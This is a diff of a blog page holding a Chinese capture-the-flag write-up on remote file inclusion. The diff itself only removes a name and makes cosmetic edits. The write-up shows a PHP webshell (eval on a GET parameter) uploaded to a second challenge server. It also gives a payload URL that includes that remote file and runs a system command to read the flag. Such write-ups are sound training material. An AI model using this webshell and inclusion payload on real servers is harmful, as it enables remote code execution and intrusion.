@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>远程文件包含（RFI）甄洪琳 | youbing的博客</title>
+    <title>远程文件包含（RFI） | youbing的博客</title>
     <meta name="author" content="youbing" />
     <meta name="description" content="技术博客，分享编程学习笔记" />
     <meta name="keywords" content="编程,学习,技术" />
@@ -156,7 +156,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>远程文件包含（RFI）甄洪琳</h1>
+        <h1>远程文件包含（RFI）</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -182,7 +182,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ffa2c4">
+                <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00bcd4">
                     文件包含
                 </a>
             </span>
@@ -193,15 +193,15 @@
     
     <div class="content" v-pre>
         <p>这道题可以远程查看外部文件，尝试用data协议执行恶意文件</p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_1c082d26.png" alt="远程文件包含(RFI)甄洪琳_1c082d26"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_1c082d26.png" alt="远程文件包含(RFI)_1c082d26"></p>
 <p>这里被禁止了，用外部链接让它读取恶意文件，开了一个文件上传的题目用文件上传题目的服务器给这个题目读恶意文件，在文件上传的题目中上传一个123.txt</p>
 <p>内容：<?php highlight_file(__FILE__);eval($_GET[1]);?></p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_ab3664f1.png" alt="远程文件包含(RFI)甄洪琳_ab3664f1"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_ab3664f1.png" alt="远程文件包含(RFI)_ab3664f1"></p>
 <p>然后让这道题去读取这个文件</p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_08d8268a.png" alt="远程文件包含(RFI)甄洪琳_08d8268a"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_08d8268a.png" alt="远程文件包含(RFI)_08d8268a"></p>
 <p>成功读取道，用代码中的1参数执行命令得到flag</p>
 <p>Payload：?path&#x3D;http%3A%2F%2Fa5e91015-92c8-4e39-bfea-78d3ff0af054.node5.buuoj.cn%3A81%2Fuplo4d%2Fb52f6f78c93f7934d640cc67ae99fbd1.txt&amp;1&#x3D;system(%27tac%20f*%27);</p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_67d2f38c.png" alt="远程文件包含(RFI)甄洪琳_67d2f38c"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_67d2f38c.png" alt="远程文件包含(RFI)_67d2f38c"></p>
 <p>CTF{http_rfi_1s_fun}</p>
 
     </div>
@@ -250,7 +250,7 @@
     
 <script
     src="https://giscus.app/client.js"
-    data-repo="youbing3432213764-coder/youbing3432213764-coder.github.io"
+    data-repo="Youbing3432213764-coder/Youbing3432213764-coder.github.io"
     data-repo-id=""
     data-category=""
     data-category-id=""
